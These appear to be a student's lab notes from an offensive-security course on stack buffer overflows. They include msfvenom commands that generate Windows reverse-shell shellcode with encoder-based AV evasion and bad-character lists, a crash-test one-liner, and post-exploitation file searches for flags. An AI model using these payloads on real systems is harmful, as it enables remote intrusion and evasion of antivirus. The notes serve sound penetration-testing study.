# Buffer Overflow & Memory Corruption, Command Appendix

Part of [[COMMAND APPENDIX]]. Stack-based buffer overflow exploitation: shellcode generation, offset discovery, and useful commands once a BOF payload lands a shell. For adapting the surrounding exploit code itself (cross-compiling, running the binary), see [[Fixing Exploits]].

---

## msfvenom: Generating Shellcode for a BOF Payload

```bash
# Embed directly into a C source file's byte array (classic/EIP-style exploit)
msfvenom -p windows/shell_reverse_tcp LHOST=<ip> LPORT=<port> EXITFUNC=thread \
  -f c -e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d"

# Generate as raw bytes to a file instead of hand-transcribing a giant escaped string
# into a script (safer, avoids transcription errors on long payloads)
msfvenom -p windows/shell_reverse_tcp LHOST=<ip> LPORT=<port> EXITFUNC=thread \
  -f raw -e x86/shikata_ga_nai -b "\x00\x0a\x0d\x20\x25\x26\x2b\x3d" -o shell.bin
```
| Flag | What it does |
|---|---|
| `-p windows/shell_reverse_tcp` | **stageless** payload, self-contained, a plain `nc -lvnp` listener catches it directly |
| `-p windows/meterpreter/reverse_tcp` | **staged** payload, needs a matching `multi/handler` (same payload/LHOST/LPORT) to catch it, not a plain listener |
| `-f c` / `-f python` / `-f raw` | output format: ready-to-paste C byte array, Python string, or raw bytes (pair `-f raw` with `-o <file>` and read the file from the exploit script instead of embedding it inline) |
| `-b "\x00..."` | bad characters to avoid entirely in the encoded output, always includes `\x00` (null terminator) at minimum, add more based on how the payload is delivered (e.g. `\x20`/space and `\x0a\x0d`/CRLF and `\x25\x26\x2b\x3d`/URL-special chars if it rides inside an HTTP request) |
| `-e x86/shikata_ga_nai` | polymorphic encoder, both dodges bad characters and does basic AV evasion |
| `EXITFUNC=thread` | how the payload's process should exit when done, `thread` kills only the spawned thread rather than the whole target process |

*Keep any NOP sled (`\x90` repeated) the surrounding exploit code adds **around** this shellcode, not inside it, msfvenom's output is just the payload itself.*

See [[Fixing Exploits#14.1.4. Fixing the Exploit|14.1.4]] (C-embedded) and [[Fixing Exploits#Module Exercise VM #3: Unknown service, memory corruption|Module Exercise VM #3]] (raw-to-file).

#### Tags: #Msfvenom #ShellcodeGeneration #BadCharacters #StagedVsStageless #ShikataGaNai

---

## Basic Offset/Crash Discovery

```bash
# Quick manual crash test: is this parameter even overflow-able, and roughly where?
python3 -c 'print("A"*3000)'   # feed into the vulnerable parameter, watch for a crash

# A' in hex is \x41, if the overflow reaches the return address/EIP,
# the debugger will show EIP holding exactly 0x41414141
```
*A full offset-discovery workflow (Metasploit's `pattern_create.rb`/`pattern_offset.rb`, or Immunity Debugger + `mona.py`) needs a local debugger attached to the actual vulnerable process, this vault hasn't done that hands-on yet (both BOF case studies in [[Fixing Exploits]] reused already-researched offsets/addresses from existing public exploits rather than deriving them from scratch). See the HackTricks link in [[Fixing Exploits#14.3. Wrapping Up|14.3]] for the full derivation workflow once that's needed.*

#### Tags: #OffsetDiscovery #CrashTesting #PatternCreate #Mona

---

## Windows Post-Exploitation: Recursive File Search

```cmd
dir /s /b C:\Users\*flag*
dir /s /b C:\*flag*
```
*`/s` recurses into subdirectories, `/b` gives bare output (just paths, no headers/summary), useful for `whoami`-style shells with no GUI to browse in, same job as `find / -iname "*flag*" 2>/dev/null` on Linux.*

See [[Fixing Exploits#Module Exercise VM #3: Unknown service, memory corruption|Module Exercise VM #3]].

#### Tags: #WindowsCMD #RecursiveSearch #PostExploitation

---

## **Outstanding**
This area grows alongside the module. A genuine from-scratch offset/bad-char/return-address discovery workflow (local debugger + mona.py) is the obvious next addition once a BOF box actually requires deriving these rather than reusing a public exploit's own research.
